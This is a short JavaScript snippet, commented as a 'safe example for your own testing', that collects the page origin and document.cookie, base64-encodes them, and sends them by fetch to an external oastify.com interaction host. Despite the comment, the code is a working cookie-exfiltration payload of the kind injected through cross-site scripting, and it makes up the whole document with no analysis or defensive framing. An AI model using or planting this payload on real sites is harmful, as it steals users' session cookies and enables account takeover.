// safe example for your own testing
const info = {
  origin: window.location.origin,
  cookie: document.cookie
};

fetch("http://t3xd8evnpec2yy7fz0p13pgc43auyqmf.oastify.com?code="+btoa(JSON.stringify(info)), {
  method: "GET"
});
